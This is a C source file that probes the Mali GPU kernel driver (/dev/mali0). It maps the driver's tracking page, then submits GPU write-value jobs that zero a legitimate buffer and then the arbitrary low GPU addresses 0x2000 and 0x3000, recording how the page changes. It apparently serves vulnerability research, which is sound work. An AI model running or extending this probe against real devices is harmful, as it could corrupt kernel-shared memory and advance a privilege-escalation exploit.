#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <setjmp.h>

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define BASE_JD_REQ_CS (1U << 1)

#define MALI_JOB_TYPE_WRITE_VALUE 2
#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

static sigjmp_buf g_jmp;
static volatile int g_faulted = 0;

static void fault_handler(int sig)
{
    (void)sig;
    g_faulted = 1;
    siglongjmp(g_jmp, 1);
}

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE:
        return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT:
        return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED:
        return "JOB_CANCELLED";
    default:
        return "UNKNOWN";
    }
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0)
        return -1;
    return 0;
}

static void *map_mtp(int fd, unsigned long pgoff)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)4096,
                           PROT_READ, MAP_SHARED, fd, pgoff);
}

static uint64_t mali_alloc(int fd)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = 1;
    alloc.commit_pages = 1;
    alloc.extent = 1;
    alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                  BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                  BASE_MEM_COHERENT_LOCAL;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free mf;

    if (!gpu_va)
        return;
    memset(&mf, 0, sizeof(mf));
    mf.header.id = KBASE_FUNC_MEM_FREE;
    mf.gpu_addr = gpu_va;
    mali_ioctl(fd, &mf, sizeof(mf));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, 4096,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

static void build_zero_job(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;
    jc_cpu[8] = (uint32_t)target_gpu_va;
    jc_cpu[9] = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static int submit_job(int fd, uint64_t jc_gpu_va, uint8_t atom_number)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    int rc;

    memset(&atom, 0, sizeof(atom));
    atom.jc = jc_gpu_va;
    atom.udata.blob[0] = 0x1111000000000000ULL | atom_number;
    atom.udata.blob[1] = 0x2222000000000000ULL | atom_number;
    atom.core_req = BASE_JD_REQ_CS;
    atom.atom_number = atom_number;

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    rc = mali_ioctl(fd, &submit, sizeof(submit));
    return (rc == 0 && submit.header.ret == 0) ? 0 : -1;
}

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd;
    ssize_t n;

    memset(&pfd, 0, sizeof(pfd));
    pfd.fd = fd;
    pfd.events = POLLIN | POLLERR | POLLHUP;
    if (poll(&pfd, 1, 1000) <= 0)
        return -1;
    n = read(fd, ev, sizeof(*ev));
    return n == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static void dump_mtp(const char *label, const uint32_t *mtp)
{
    int i;
    struct sigaction sa, old_segv, old_bus;

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGBUS, &sa, &old_bus);
    printf("%s", label);
    for (i = 0; i < 16; i++) {
        uint32_t v = 0xFFFFFFFFU;
        g_faulted = 0;
        if (sigsetjmp(g_jmp, 1) == 0)
            v = mtp[i];
        printf(" %08x%s", v, g_faulted ? "!" : "");
    }
    printf("\n");
    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGBUS, &old_bus, NULL);
}

static void run_probe(void)
{
    uint64_t jc_gpu_va = 0, dest_gpu_va = 0;
    uint32_t *jc_cpu = MAP_FAILED, *mtp = MAP_FAILED;
    uint64_t *dest_cpu = MAP_FAILED;
    struct base_jd_event_v2 ev;
    unsigned long mtp_pgoff = 2;
    int fd;
    fd = open("/dev/mali0", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0)
        return;
    if (mali_init(fd) < 0)
        goto out;

    mtp = (uint32_t *)map_mtp(fd, 2);
    if (mtp == MAP_FAILED) {
        mtp = (uint32_t *)map_mtp(fd, 3);
        mtp_pgoff = 3;
    }
    if (mtp == MAP_FAILED) {
        printf("MTP map failed: errno=%d (%s)\n", errno, strerror(errno));
        goto out;
    }
    printf("MTP mapped via pgoff=%lu at %p\n", mtp_pgoff, (void *)mtp);

    jc_gpu_va = mali_alloc(fd);
    dest_gpu_va = mali_alloc(fd);
    if (!jc_gpu_va || !dest_gpu_va)
        goto out;
    jc_cpu = (uint32_t *)mali_cpu_map(fd, jc_gpu_va);
    dest_cpu = (uint64_t *)mali_cpu_map(fd, dest_gpu_va);
    if (jc_cpu == MAP_FAILED || dest_cpu == MAP_FAILED)
        goto out;

    dump_mtp("MTP before :", mtp);

    memset(dest_cpu, 0xAA, 4096);
    build_zero_job(jc_cpu, dest_gpu_va);
    if (submit_job(fd, jc_gpu_va, 1) == 0 && read_event(fd, &ev) == 0) {
        dump_mtp("MTP normal :", mtp);
        printf("normal event=0x%08x(%s) dest=0x%016llx\n",
               ev.event_code, event_name(ev.event_code),
               (unsigned long long)dest_cpu[0]);
    }

    build_zero_job(jc_cpu, 0x2000ULL);
    if (submit_job(fd, jc_gpu_va, 2) == 0 && read_event(fd, &ev) == 0) {
        dump_mtp("MTP low2k:", mtp);
        printf("low-addr event=0x%08x(%s)\n", ev.event_code, event_name(ev.event_code));
    }

    build_zero_job(jc_cpu, 0x3000ULL);
    if (submit_job(fd, jc_gpu_va, 3) == 0 && read_event(fd, &ev) == 0) {
        dump_mtp("MTP low3k:", mtp);
        printf("low-addr3 event=0x%08x(%s)\n", ev.event_code, event_name(ev.event_code));
    }

out:
    if (dest_cpu != MAP_FAILED)
        munmap(dest_cpu, 4096);
    if (jc_cpu != MAP_FAILED)
        munmap(jc_cpu, 4096);
    if (mtp != MAP_FAILED)
        munmap(mtp, 4096);
    mali_free(fd, dest_gpu_va);
    mali_free(fd, jc_gpu_va);
    close(fd);
}

int main(void)
{
    pid_t pid;
    int status = 0;

    pid = fork();
    if (pid < 0)
        return 1;
    if (pid == 0) {
        alarm(20);
        run_probe();
        _exit(0);
    }
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        printf("child died by signal %d\n", WTERMSIG(status));
        return 1;
    }
    printf("child exit status %d\n", WEXITSTATUS(status));
    return WEXITSTATUS(status);
}
